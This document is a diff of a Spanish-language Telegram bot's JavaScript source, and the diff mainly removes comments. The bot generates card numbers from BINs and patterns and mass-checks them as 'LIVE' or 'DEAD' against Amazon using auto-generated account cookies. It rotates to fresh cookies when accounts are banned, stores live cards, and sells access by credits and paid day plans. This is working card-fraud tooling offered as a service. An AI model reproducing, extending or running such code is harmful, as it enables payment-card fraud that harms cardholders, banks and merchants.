         if (matchCard) tarjetas.push(`${matchCard[1]}|${matchCard[2]}|${matchCard[3]}|${matchCard[4]}`);
     }
 
@@ -1271,24 +1185,19 @@ async function handleAmazonCookieInfinita(chatId, telegramId, fullParam) {
     const total = tarjetas.length;
     await sendSafeMessage(chatId, `🎴 *Tarjetas a verificar (${total}):*\n${tarjetas.slice(0, 20).map(t => `\`${t}\``).join('\n')}${total > 20 ? `\n... y ${total - 20} más` : ''}`, { parse_mode: 'Markdown' });
 
-    // Mensaje de cancelación
     await sendSafeMessage(chatId, '💡 *Si deseas cancelar el proceso, envía un mensaje diciendo "Cancelar"*');
 
-    // Calcular número de cookies necesarias
     const COOKIE_CAPACITY = 13;
     let cookiesNeeded = Math.ceil(total / COOKIE_CAPACITY);
     if (cookiesNeeded < 1) cookiesNeeded = 1;
     if (cookiesNeeded > 10) cookiesNeeded = 10;
 
-    // Mensaje para mostrar el progreso de generación de cookies
     let cookieMsg = await sendSafeMessage(chatId, '🍪 *Generando cookies...*', { parse_mode: 'Markdown' });
     if (!cookieMsg) return;
     let cookieLines = [];
     let cookiesDisponibles = [];
 
-    // Generar cookies una por una y actualizar el mensaje
     for (let i = 0; i < cookiesNeeded + 1; i++) {
-        // Si se ha solicitado cancelar, salir
         if (cancellationFlags.get(telegramId)) {
             await sendSafeMessage(chatId, '⏹️ Proceso cancelado durante la generación de cookies.');
             cancellationFlags.delete(telegramId);
@@ -1312,20 +1221,16 @@ async function handleAmazonCookieInfinita(chatId, telegramId, fullParam) {
             cookieLines[lineIndex] = `❌ Cookie No. ${i+1}: error al generar (${err.message})`;
             newText = '🍪 *Generación de cookies:*\n' + cookieLines.join('\n');
             await bot.editMessageText(newText, { chat_id: chatId, message_id: cookieMsg.message_id, parse_mode: 'Markdown' });
-            // Si falla, no la añadimos a disponibles, pero continuamos con las siguientes
         }
-        // Pequeña pausa para no saturar
         await new Promise(r => setTimeout(r, 500));
     }
 
-    // Si no hay cookies disponibles, abortar
     if (cookiesDisponibles.length === 0) {
         await sendSafeMessage(chatId, '❌ No se pudo generar ninguna cookie. Proceso abortado.');
         cancellationFlags.delete(telegramId);
         return;
     }
 
-    // Mensaje de chequeo
     let stats = { lives: 0, deads: 0, errors: 0, cookiesUsadas: 0 };
     let resultados = [];
     let progressMsg = null;
@@ -1339,14 +1244,11 @@ async function handleAmazonCookieInfinita(chatId, telegramId, fullParam) {
     let cookieIndex = 0;
     let currentCookie = cookiesDisponibles[cookieIndex] || null;
 
-    // Función para reponer cookies en segundo plano (si se necesita)
     const reponerCookie = async () => {
         if (cookiesDisponibles.length <= cookieIndex + 1) {
-            // Solo si hay menos cookies de las necesarias
             try {
                 const nueva = await generarCookieUnica(telegramId);
                 cookiesDisponibles.push(nueva);
-                // Agregar línea al mensaje de cookies
                 const idx = cookiesDisponibles.length - 1;
                 cookieLines.push(`✅ Cookie No. ${idx+1}: creada exitosamente (extra)`);
                 let newText = '🍪 *Generación de cookies:*\n' + cookieLines.join('\n');
@@ -1358,9 +1260,7 @@ async function handleAmazonCookieInfinita(chatId, telegramId, fullParam) {
         }
     };
 
-    // Chequeo de tarjetas
     for (let i = 0; i < total; i++) {
-        // Verificar cancelación
         if (cancellationFlags.get(telegramId)) {
             await sendSafeMessage(chatId, '⏹️ Proceso cancelado por el usuario.');
             await bot.editMessageText(buildProgressMessage(resultados, total, null), { chat_id: chatId, message_id: progressMsg.message_id, parse_mode: 'Markdown' });
@@ -1376,7 +1276,6 @@ async function handleAmazonCookieInfinita(chatId, telegramId, fullParam) {
 
         let resultado = await verificarTarjeta(card, currentCookie);
 
-        // Si es error y no es baneo, reintentar una vez
         if (resultado.status !== 'LIVE' && resultado.status !== 'DEAD' && !resultado.isBanned) {
             const reintento = await verificarTarjeta(card, currentCookie);
             if (reintento.status === 'LIVE' || reintento.status === 'DEAD') {
@@ -1384,23 +1283,18 @@ async function handleAmazonCookieInfinita(chatId, telegramId, fullParam) {
             }
         }
 
-        // Si la cookie expiró o cuenta baneada
         if (resultado.isBanned) {
-            // Actualizar línea de la cookie actual como baneada
             if (cookieIndex < cookieLines.length) {
                 cookieLines[cookieIndex] = `❌ Cookie No. ${cookieIndex+1}: baneada`;
                 let newText = '🍪 *Generación de cookies:*\n' + cookieLines.join('\n');
                 await bot.editMessageText(newText, { chat_id: chatId, message_id: cookieMsg.message_id, parse_mode: 'Markdown' });
             }
 
-            // Intentar cambiar a siguiente cookie
             if (cookiesDisponibles.length > cookieIndex + 1) {
                 cookieIndex++;
                 currentCookie = cookiesDisponibles[cookieIndex];
                 stats.cookiesUsadas++;
-                // Reponer cookie gastada en segundo plano
                 reponerCookie();
-                // Reintentar la misma tarjeta con la nueva cookie
                 const reintentoBaneo = await verificarTarjeta(card, currentCookie);
                 if (reintentoBaneo.isBanned) {
                     resultados.push({ card, status: 'ERROR - Cuenta baneada ⛔' });
@@ -1413,7 +1307,6 @@ async function handleAmazonCookieInfinita(chatId, telegramId, fullParam) {
                     resultado = reintentoBaneo;
                 }
             } else {
-                // No hay más cookies, generar una nueva
                 try {
                     currentCookie = await generarCookieUnica(telegramId);
                     cookiesDisponibles.push(currentCookie);
@@ -1444,12 +1337,10 @@ async function handleAmazonCookieInfinita(chatId, telegramId, fullParam) {
             }
         }
 
-        // Actualizar estadísticas
         if (resultado.status === 'LIVE') stats.lives++;
         else if (resultado.status === 'DEAD') stats.deads++;
         else stats.errors++;
 
-        // Guardar live si es LIVE
         if (resultado.status === 'LIVE') {
             try {
                 const userRes = await pool.query('SELECT username FROM users WHERE telegram_id = $1', [telegramId]);
@@ -1469,7 +1360,6 @@ async function handleAmazonCookieInfinita(chatId, telegramId, fullParam) {
             }
         }
 
-        // Determinar estado a mostrar
         let statusDisplay = '';
         if (resultado.status === 'LIVE') statusDisplay = 'LIVE ✅';
         else if (resultado.status === 'DEAD') statusDisplay = 'DEAD ❌';
@@ -1495,11 +1385,9 @@ async function handleAmazonCookieInfinita(chatId, telegramId, fullParam) {
         await new Promise(r => setTimeout(r, 800));
     }
 
-    // Resumen final
     const resumen = `📊 *RESULTADO FINAL*\n🔹 Tarjetas: ${total}\n🔹 Créditos gastados: ${stats.cookiesUsadas * 4}\n💚 LIVE: ${stats.lives} | ❌ DEAD: ${stats.deads} | ⚠️ ERROR: ${stats.errors}\n🍪 Cookies usadas: ${stats.cookiesUsadas}`;
     await sendSafeMessage(chatId, resumen, { parse_mode: 'Markdown' });
 
-    // Limpiar flag
     cancellationFlags.delete(telegramId);
 }
 
@@ -1523,7 +1411,6 @@ function clearUserState(telegramId) {
     userStates.delete(telegramId);
 }
 
-// ========== FUNCIONES PARA COMANDOS ==========
 async function handleGenCookieCommand(chatId, telegramId, country) {
     if (!await checkAndKickIfNoDaysOrCredits(telegramId, chatId, 0)) return;
     const paises = ['MX','US','CA','UK','DE','FR','IT','ES','JP','AU','IN'];
@@ -1554,6 +1441,7 @@ async function handleGenCookieCommand(chatId, telegramId, country) {
         await sendSafeMessage(chatId, `❌ Error: ${error.message}`);
     }
 }
+
 async function procesarExtraConCantidad(chatId, telegramId, extra, cantidad) {
     await sendSafeMessage(chatId, `🃏 Generando ${cantidad} tarjetas desde el extra...`);
     const todasLasTarjetas = generarTarjetasDesdePatron(extra, cantidad);
@@ -1566,44 +1454,35 @@ async function procesarExtraConCantidad(chatId, telegramId, extra, cantidad) {
     let stats = { lives: 0, deads: 0, errors: 0, cookiesUsadas: 1 };
     let progressMsg = null;
 
-    // Mensaje inicial
     const textoInicial = buildProgressMessage(resultados, total, todasLasTarjetas[0]);
     progressMsg = await sendSafeMessage(chatId, textoInicial, { parse_mode: 'Markdown' });
     if (!progressMsg) return;
 
     for (let i = 0; i < total; i++) {
         const card = todasLasTarjetas[i];
-        // Actualizar mensaje con "Verificando"
         const textoPendiente = buildProgressMessage(resultados, total, card);
         try {
             await bot.editMessageText(textoPendiente, { chat_id: chatId, message_id: progressMsg.message_id, parse_mode: 'Markdown' });
         } catch (e) {}
 
-        // Verificar tarjeta con cookie actual
         let resultado = await verificarTarjetaConReintentos(card, currentCookie, 2);
 
-        // Si la cookie expiró o cuenta baneada, intentar cambiar a cookie de reserva
         if (resultado.isBanned) {
             await sendSafeMessage(chatId, `⛔ Cookie expirada o baneada en tarjeta ${i+1}. Intentando con cookie de reserva...`);
             
-            // Intentar usar cookie de reserva
             if (nextCookiePromise) {
                 currentCookie = await nextCookiePromise;
                 if (!currentCookie) {
-                    // Si la reserva falló, generar una nueva directamente
                     currentCookie = await generarCookieUnica(telegramId);
                 }
             } else {
                 currentCookie = await generarCookieUnica(telegramId);
             }
-            // Lanzar nueva reserva
             nextCookiePromise = generarCookieUnica(telegramId).catch(err => { console.error('Error generando nueva cookie de reserva:', err); return null; });
             stats.cookiesUsadas++;
             
-            // Reintentar la misma tarjeta con la nueva cookie
             const segundoIntento = await verificarTarjetaConReintentos(card, currentCookie, 2);
             if (segundoIntento.isBanned) {
-                // Si sigue baneado, es un baneo definitivo de cuenta
                 resultados.push({
                     card: card,
                     status: 'ERROR - Cuenta baneada ⛔'
@@ -1613,13 +1492,11 @@ async function procesarExtraConCantidad(chatId, telegramId, extra, cantidad) {
                     await bot.editMessageText(finalText, { chat_id: chatId, message_id: progressMsg.message_id, parse_mode: 'Markdown' });
                 } catch (e) {}
                 await sendSafeMessage(chatId, `⛔ Cuenta baneada detectada en tarjeta ${i+1}. Proceso cancelado.`);
-                return; // Terminar la función
+                return;
             }
-            // Si el segundo intento funciona, usamos ese resultado
             resultado = segundoIntento;
         }
 
-        // Procesar resultado normal
         if (resultado.status === 'LIVE') stats.lives++;
         else if (resultado.status === 'DEAD') stats.deads++;
         else stats.errors++;
@@ -1641,7 +1518,6 @@ async function procesarExtraConCantidad(chatId, telegramId, extra, cantidad) {
             } catch (err) { console.error('Error guardando live:', err.message); }
         }
 
-        // Determinar display de estado
         let statusDisplay = '';
         if (resultado.status === 'LIVE') statusDisplay = 'LIVE ✅';
         else if (resultado.status === 'DEAD') statusDisplay = 'DEAD ❌';
@@ -1682,7 +1558,6 @@ async function getUserDevicesForBot(userId) {
 }
 
 async function detectMulticuentasForBot(deviceFingerprint, newUserId, newUsername) { 
-
     if (!deviceFingerprint) return null;
     const res = await pool.query(
         `SELECT DISTINCT u.id, u.username, u.role, al.created_at as last_used
@@ -1704,10 +1579,8 @@ async function detectMulticuentasForBot(deviceFingerprint, newUserId, newUsernam
     return null;
 }
 
-
 // ========== COMANDOS ==========
 
-// ========== COMANDO /regalarcookie ==========
 bot.onText(/^[\/\.](?:regalarcookie|regck|rgck)(?:\s+([^\s]+))?/i, async (msg, match) => {
     const chatId = msg.chat.id;
     const telegramId = msg.from.id;
@@ -1721,7 +1594,6 @@ bot.onText(/^[\/\.](?:regalarcookie|regck|rgck)(?:\s+([^\s]+))?/i, async (msg, m
         return sendSafeMessage(chatId, '📤 Uso: /regalarcookie @usuario o /regalarcookie vip  (o responde a un mensaje con cookie)');
     }
 
-    // Obtener cookie del mensaje respondido (si existe)
     let msgCookie = '';
     if (msg.reply_to_message && msg.reply_to_message.text) {
         const lines = msg.reply_to_message.text.split('\n');
@@ -1744,7 +1616,6 @@ bot.onText(/^[\/\.](?:regalarcookie|regck|rgck)(?:\s+([^\s]+))?/i, async (msg, m
         }
     }
 
-    // Si no hay cookie, generar una nueva
     if (!msgCookie) {
         try {
             const globalForcePlaywright = await getGlobalForcePlaywright();
@@ -1766,7 +1637,6 @@ bot.onText(/^[\/\.](?:regalarcookie|regck|rgck)(?:\s+([^\s]+))?/i, async (msg, m
         }
     }
 
-    // Determinar destino final
     let targetUserId = null;
     let targetUsername = null;
     let isVip = false;
@@ -1800,7 +1670,6 @@ bot.onText(/^[\/\.](?:regalarcookie|regck|rgck)(?:\s+([^\s]+))?/i, async (msg, m
     }
 });
 
-
 bot.onText(/\/gencukilento/, async (msg) => {
     const chatId = msg.chat.id;
     const telegramId = msg.from.id;
@@ -1817,7 +1686,6 @@ bot.onText(/\/gencukilento/, async (msg) => {
     await sendSafeMessage(chatId, `🐢 Modo lento: ${status}`);
 });
 
-
 bot.onText(/\/estatusCuki/, async (msg) => {
     const chatId = msg.chat.id;
     const telegramId = msg.from.id;
@@ -1832,7 +1700,7 @@ bot.onText(/\/estatusCuki/, async (msg) => {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
-                'x-bot-key': BOT_API_KEY   // ✅ Usa x-bot-key
+                'x-bot-key': BOT_API_KEY
             }
         });
         const data = await response.json();
@@ -1848,8 +1716,6 @@ bot.onText(/\/estatusCuki/, async (msg) => {
     }
 });
 
-
-
 bot.onText(/^[\/\.]start/, async (msg) => {
     const chatId = msg.chat.id;
     const from = msg.from;
@@ -1860,7 +1726,6 @@ bot.onText(/^[\/\.]start/, async (msg) => {
     try {
         const existing = await pool.query('SELECT credits, days_remaining FROM users WHERE telegram_id = $1', [telegramId]);
         const isNew = existing.rows.length === 0;
-        // upsertUser
         const client = await pool.connect();
         try {
             await client.query('BEGIN');
@@ -2031,18 +1896,15 @@ bot.onText(/^[\/\.]setplan(40|80|150|250)(?:\s+([^\s]+))?/i, async (msg, match) 
     clearUserState(requesterTelegramId);
 });
 
-// ========== COMANDO /amazonmultiextra ==========
 bot.onText(/^[\/\.](?:amazonmultiextra|amzme|amazonme|multiextra)(?:\s+([\s\S]+))?/i, async (msg, match) => {
     const chatId = msg.chat.id;
     const telegramId = msg.from.id;
     let input = match[1] ? match[1].trim() : '';
 
-    // Si no hay input pero hay reply, usar el texto del mensaje respondido
     if (!input && msg.reply_to_message?.text) {
         input = msg.reply_to_message.text.trim();
     }
 
-    // Llamar al handler separado
     await handleMultiExtraCommand(chatId, telegramId, input);
 });
 
@@ -2143,10 +2005,6 @@ bot.onText(/^[\/\.]setuser(?:\s+([^\s]+))?/i, async (msg, match) => {
     clearUserState(requesterTelegramId);
 });
 
-
-
-// ========== COMANDOS PARA MULTICUENTAS ==========
-// /multicuentas - Lista usuarios que comparten fingerprint
 bot.onText(/^[\/\.]multicuentas$/i, async (msg) => {
     const chatId = msg.chat.id;
     const role = await getUserRoleFromDB(msg.from.id);
@@ -2175,7 +2033,6 @@ bot.onText(/^[\/\.]multicuentas$/i, async (msg) => {
     await sendSafeMessage(chatId, message, { parse_mode: 'Markdown' });
 });
 
-// /dispositivos @usuario - Ver dispositivos de un usuario
 bot.onText(/^[\/\.]dispositivos\s+([^\s]+)/i, async (msg, match) => {
     const chatId = msg.chat.id;
     const requesterRole = await getUserRoleFromDB(msg.from.id);
@@ -2200,9 +2057,6 @@ bot.onText(/^[\/\.]dispositivos\s+([^\s]+)/i, async (msg, match) => {
         await sendSafeMessage(chatId, `❌ ${error.message}`);
     }
 });
-
-
-
 
 bot.onText(/^[\/\.]ban(?:\s+([^\s]+))?/i, async (msg, match) => {
     const chatId = msg.chat.id;
@@ -2266,11 +2120,9 @@ bot.onText(/^[\/\.]unban(?:\s+([^\s]+))?/i, async (msg, match) => {
     clearUserState(requesterTelegramId);
 });
 
-// ========== COMANDOS DE EXTRAPOLACIÓN Y VERIFICACIÓN ==========
 bot.onText(/^[\/\.](?:gencookie\b|gencuki\b|genck\b|gnck\b)(?:\s+\w+)?/i, async (msg, match) => {
     const chatId = msg.chat.id;
     const telegramId = msg.from.id;
-    // Siempre usar México (MX)
     await handleGenCookieCommand(chatId, telegramId, 'MX');
     clearUserState(telegramId);
 });
@@ -2282,7 +2134,6 @@ bot.onText(/^[\/\.](?:amazoncookieinfinita|amzckin|amazoninfinita)(?:\s+([\s\S]+
     await handleAmazonCookieInfinita(chatId, telegramId, fullParam);
 });
 
-// ========== OTROS COMANDOS (resumidos) ==========
 bot.onText(/^[\/\.]info(?:\s+([^\s]+))?/i, async (msg, match) => {
     const chatId = msg.chat.id;
     const requesterId = msg.from.id;
@@ -2308,14 +2159,11 @@ bot.onText(/^[\/\.]gracias$/i, async (msg) => {
     await sendSafeMessage(msg.chat.id, "D nada preciosaa (˶ᵔ ᵕ ᵔ˶) ‹𝟹, un placer contribuir a alcanzar tu autonomía económica, emocional y espiritual ୭ ˚. ᵎᵎ");
 });
 
-// ========== COMANDO /amazon (usa cookie guardada) ==========
-// ========== COMANDO /amazon (usa cookie guardada) ==========
 bot.onText(/^[\/\.](?:amazon\b|amz\b)(?:\s+([\s\S]+))?/i, async (msg, match) => {
     const chatId = msg.chat.id;
     const telegramId = msg.from.id;
     let param = match[1] ? match[1].trim() : '';
     
-    // Si no hay parámetro y hay reply, usar el texto del reply
     if (!param && msg.reply_to_message?.text) {
         param = msg.reply_to_message.text.trim();
     }
@@ -2328,7 +2176,6 @@ bot.onText(/^[\/\.](?:amazon\b|amz\b)(?:\s+([\s\S]+))?/i, async (msg, match) => 
     clearUserState(telegramId);
 });
 
-// ========== COMANDO /amazoncookie (genera cookie nueva) ==========
 bot.onText(/^[\/\.](?:amazoncookie|amazoncuki|amazonck|amzck)\b(?:\s+([\s\S]+))?/i, async (msg, match) => {
     const chatId = msg.chat.id;
     const telegramId = msg.from.id;
@@ -2340,7 +2187,6 @@ bot.onText(/^[\/\.](?:amazoncookie|amazoncuki|amazonck|amzck)\b(?:\s+([\s\S]+))?
 
     clearUserState(telegramId);
 
-    // Función para generar cookie y mostrar detalles
     async function generarCookieYMostrar(chatId, telegramId) {
         try {
             const globalForcePlaywright = await getGlobalForcePlaywright();
@@ -2371,7 +2217,6 @@ bot.onText(/^[\/\.](?:amazoncookie|amazoncuki|amazonck|amzck)\b(?:\s+([\s\S]+))?
         }
     }
 
-    // ========== CASO 1: Sin parámetros (modo interactivo) ==========
     if (!param) {
         await sendSafeMessage(chatId, '🍪 Generando nueva cookie...');
         const result = await generarCookieYMostrar(chatId, telegramId);
@@ -2382,26 +2227,22 @@ bot.onText(/^[\/\.](?:amazoncookie|amazoncuki|amazonck|amzck)\b(?:\s+([\s\S]+))?
         return;
     }
 
-    // ========== LIMPIAR SALTOS DE LÍNEA ==========
     let inputLimpio = param;
-    // Si hay saltos de línea y no parece una lista de tarjetas (ya que tarjetas está vacío), unir con '|'
     if (param.includes('\n')) {
         inputLimpio = param.replace(/\n/g, '|').replace(/\s+/g, '');
     }
 
-    // ========== CASO 2: Detectar tarjetas ==========
     let tarjetas = limpiarTarjetas(param);
     if (tarjetas.length > 0) {
         await sendSafeMessage(chatId, `💳 *Tarjetas a verificar (${tarjetas.length}):*\n${tarjetas.map(t => `\`${t}\``).join('\n')}`, { parse_mode: 'Markdown' });
         await sendSafeMessage(chatId, '🍪 Generando cookie para verificación...');
         const result = await generarCookieYMostrar(chatId, telegramId);
         if (result) {
-            await verificarTarjetasConProgreso(chatId, telegramId, result.cookie, tarjetas, null);
+            await verificarTarjetasConProgreso(chatId, telegramId, result.cookie, tarjetas);
         }
         return;
     }
 
-    // ========== CASO 3: Es BIN o banco (usando inputLimpio) ==========
     const esBin = /^\d{6}$/.test(inputLimpio);
     const esBanco = !esBin && getBinForBank?.(inputLimpio) !== null;
 
@@ -2437,16 +2278,14 @@ bot.onText(/^[\/\.](?:amazoncookie|amazoncuki|amazonck|amzck)\b(?:\s+([\s\S]+))?
             if (extrapolationError) throw extrapolationError;
             if (!cookieResult || !extrapolation || !extrapolation.tarjetas?.length) throw new Error('No se generaron tarjetas o cookie falló');
 
-            await verificarTarjetasConProgreso(chatId, telegramId, cookieResult.cookie, extrapolation.tarjetas, extrapolation.mensajePrevio);
+            await verificarTarjetasConProgreso(chatId, telegramId, cookieResult.cookie, extrapolation.tarjetas);
         } catch (err) {
             await sendSafeMessage(chatId, `❌ Error: ${err.message}`);
         }
         return;
     }
 
-    // ========== CASO 4: Es extra (con X) ==========
     try {
-        // Usar inputLimpio para normalizar también
         const normalized = normalizarExtra(inputLimpio);
         const test = generarTarjetasDesdePatron(normalized, 1);
         if (test?.length) {
@@ -2455,7 +2294,7 @@ bot.onText(/^[\/\.](?:amazoncookie|amazoncuki|amazonck|amzck)\b(?:\s+([\s\S]+))?
             await sendSafeMessage(chatId, '🍪 Generando cookie para verificación...');
             const result = await generarCookieYMostrar(chatId, telegramId);
             if (result) {
-                await verificarTarjetasConProgreso(chatId, telegramId, result.cookie, tarjetasGen, null);
+                await verificarTarjetasConProgreso(chatId, telegramId, result.cookie, tarjetasGen);
             }
         } else {
             throw new Error('Formato no reconocido');
@@ -2465,7 +2304,6 @@ bot.onText(/^[\/\.](?:amazoncookie|amazoncuki|amazonck|amzck)\b(?:\s+([\s\S]+))?
     }
 });
 
-// ========== COMANDO /binlist ==========
 bot.onText(/^[\/\.](?:binlist|bins|list|binl|bnl)(?:\s+(.+))?/i, async (msg, match) => {
     const chatId = msg.chat.id;
     const telegramId = msg.from.id;
@@ -2479,7 +2317,6 @@ bot.onText(/^[\/\.](?:binlist|bins|list|binl|bnl)(?:\s+(.+))?/i, async (msg, mat
     clearUserState(telegramId);
 });
 
-// ========== COMANDO /extrapolador ==========
 bot.onText(/^[\/\.](?:extrapolador|extrapolado|extrapolad|extrapolar|extrapola|extrapol|extrapo|extrap|extras|extra|expo|exp|ext|xtr|xtrp|scrapper|scrapp|scrp)(?:\s+(.+))?/i, async (msg, match) => {
     const chatId = msg.chat.id;
     const telegramId = msg.from.id;
@@ -2493,7 +2330,6 @@ bot.onText(/^[\/\.](?:extrapolador|extrapolado|extrapolad|extrapolar|extrapola|e
     clearUserState(telegramId);
 });
 
-// ========== COMANDO /gen ==========
 bot.onText(/^[\/\.](?:generadorccs|genccs|gncc|gen\b)(?:\s+(.+))?/i, async (msg, match) => {
     const chatId = msg.chat.id;
     const telegramId = msg.from.id;
@@ -2506,7 +2342,6 @@ bot.onText(/^[\/\.](?:generadorccs|genccs|gncc|gen\b)(?:\s+(.+))?/i, async (msg,
     clearUserState(telegramId);
 });
 
-// ========== COMANDO /limpiador ==========
 bot.onText(/\/limpiador(?:\s+(.+))?/, async (msg, match) => {
     const chatId = msg.chat.id;
     let texto = match[1]?.trim();
@@ -2519,7 +2354,6 @@ bot.onText(/\/limpiador(?:\s+(.+))?/, async (msg, match) => {
     clearUserState(msg.from.id);
 });
 
-// ========== COMANDO /bin (información de BIN) ==========
 bot.onText(/^[\/\.](?:bin)(?:\s+(\d{6}))?/i, async (msg, match) => {
     const chatId = msg.chat.id;
     const telegramId = msg.from.id;
@@ -2544,7 +2378,6 @@ bot.onText(/^[\/\.](?:bin)(?:\s+(\d{6}))?/i, async (msg, match) => {
     clearUserState(telegramId);
 });
 
-// ========== COMANDO /lattice ==========
 bot.onText(/^[\/\.](?:lattice)(?:\s+(.+))?/i, async (msg, match) => {
     const chatId = msg.chat.id;
     const telegramId = msg.from.id;
@@ -2559,7 +2392,6 @@ bot.onText(/^[\/\.](?:lattice)(?:\s+(.+))?/i, async (msg, match) => {
     await sendSafeMessage(chatId, '💳 Envía las tarjetas (texto sucio o patrón):');
 });
 
-// ========== COMANDO /menu ==========
 bot.onText(/\/menu/, async (msg) => {
     const opts = { reply_markup: { inline_keyboard: [
         [{ text: '🍪 Generar Cookie', callback_data: 'menu_gencookie' }],
@@ -2572,7 +2404,6 @@ bot.onText(/\/menu/, async (msg) => {
     await sendSafeMessage(msg.chat.id, '📋 *Menú principal*', { parse_mode: 'Markdown', ...opts });
 });
 
-// ========== COMANDO /help ==========
 bot.onText(/\/help/, async (msg) => {
     await sendSafeMessage(msg.chat.id,
         `📖 *COMANDOS DISPONIBLES*\n\n` +
@@ -2586,14 +2417,12 @@ bot.onText(/\/help/, async (msg) => {
     );
 });
 
-// ========== COMANDO /creditos /credits /saldo ==========
 bot.onText(/\/creditos|\/credits|\/saldo/, async (msg) => {
     const user = await pool.query('SELECT credits, days_remaining FROM users WHERE telegram_id = $1', [msg.from.id]);
     if (!user.rows.length) return sendSafeMessage(msg.chat.id, '❌ Usa /start primero.');
     await sendSafeMessage(msg.chat.id, `💰 Créditos: ${user.rows[0].credits}\n📅 Días: ${user.rows[0].days_remaining}`, { parse_mode: 'Markdown' });
 });
 
-// ========== COMANDO /setcookie ==========
 bot.onText(/^[\/\.](?:setcookie|setcuki|stck|sck|setck|addcookie|addcuki|addck|dck|ack)(?:\s+(.+))?/i, async (msg, match) => {
     const chatId = msg.chat.id;
     const telegramId = msg.from.id;
@@ -2608,15 +2437,10 @@ bot.onText(/^[\/\.](?:setcookie|setcuki|stck|sck|setck|addcookie|addcuki|addck|d
     clearUserState(telegramId);
 });
 
-
 bot.onText(/^[\/\.](?:getgroupid)(?:\s+(.+))?/i, async (msg, match) => {
-
     bot.sendMessage(msg.chat.id, `ID del grupo: \`${msg.chat.id}\``, { parse_mode: 'Markdown' });
 });
 
-
-
-// ========== MANEJADOR DE CALLBACK QUERY (menú) ==========
 bot.on('callback_query', async (callbackQuery) => {
     const msg = callbackQuery.message;
     const chatId = msg.chat.id;
@@ -2653,9 +2477,6 @@ bot.on('callback_query', async (callbackQuery) => {
     }
 });
 
-
-
-// ========== CRON JOB PARA REVISIÓN MASIVA DE PERFILES ==========
 cron.schedule('0 3 * * *', async () => {
     console.log('🔄 Revisión masiva de perfiles...');
     const usersRes = await pool.query(`SELECT id, telegram_id, telegram_username, display_name FROM users WHERE telegram_id IS NOT NULL AND updated_at > NOW() - INTERVAL '30 days'`);
@@ -2668,7 +2489,6 @@ cron.schedule('0 3 * * *', async () => {
         } catch (err) { console.error(err.message); }
     }
 });
-
 
 cron.schedule('0 2 * * *', async () => {
     console.log('🔄 Revisando multicuentas por fingerprint...');
@@ -2697,9 +2517,8 @@ cron.schedule('0 2 * * *', async () => {
 bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
     const telegramId = msg.from.id;
-    const userText = msg.text; // ⬅️ DECLARADO AL PRINCIPIO
+    const userText = msg.text;
 
-    // ========== CANCELACIÓN INTERACTIVA ==========
     if (userText && userText.toLowerCase() === 'cancelar') {
         if (cancellationFlags.has(telegramId) && cancellationFlags.get(telegramId) === false) {
             cancellationFlags.set(telegramId, true);
@@ -2711,7 +2530,6 @@ bot.on('message', async (msg) => {
         }
     }
 
-    // ========== ACTUALIZACIÓN DE PERFIL ==========
     const userRes = await pool.query('SELECT id FROM users WHERE telegram_id = $1', [telegramId]);
     if (userRes.rows.length > 0) {
         const userId = userRes.rows[0].id;
@@ -2720,37 +2538,26 @@ bot.on('message', async (msg) => {
         await checkAndUpdateTelegramProfile(telegramId, userId, currentUsername, currentFullName);
     }
 
-    // ========== MANEJO DE ESTADOS INTERACTIVOS ==========
     const state = userStates.get(telegramId);
     if (!state || !state.step) return;
     if (msg.text?.startsWith('/')) return;
 
-    // A partir de aquí, ya no declares `const userText = msg.text;` nuevamente.
-    // Usa la variable `userText` que ya declaraste al inicio.
-
     switch (state.step) {
-        case 'awaiting_amazoninfinita_cantidad':
-            // ... tu código ...
-            break;
-        // ... otros casos ...
         default:
             clearUserState(telegramId);
             break;
     }
 });
 
-// bot_telegram.js - al final
 module.exports = { 
     bot, 
     sendSafeMessage, 
-    sendLiveToTelegram,   // <-- agregar
+    sendLiveToTelegram,
     notifyAdminsAndGroups,
     escapeMarkdown,
     pool 
 };
 
-
-// ========== CRON JOB PARA RESTAR DÍAS Y EXPULSAR ==========
 cron.schedule('1 0 * * *', async () => {
     console.log('🕒 Ejecutando tarea programada: restando 1 día a todos los usuarios...');
     const client = await pool.connect();
@@ -2769,7 +2576,6 @@ cron.schedule('1 0 * * *', async () => {
                     const telegramId = tgRes.rows[0]?.telegram_id;
                     if (telegramId) {
                         try {
-                            // Usa bot.kickChatMember directamente
                             await kickUserFromGroup(telegramId);
                             console.log(`✅ Usuario ${user.username} (${telegramId}) expulsado por días 0`);
                             await sendSafeMessage(telegramId, '❌ Tus días han expirado. Has sido expulsado del grupo. Contacta al admin para renovar.');
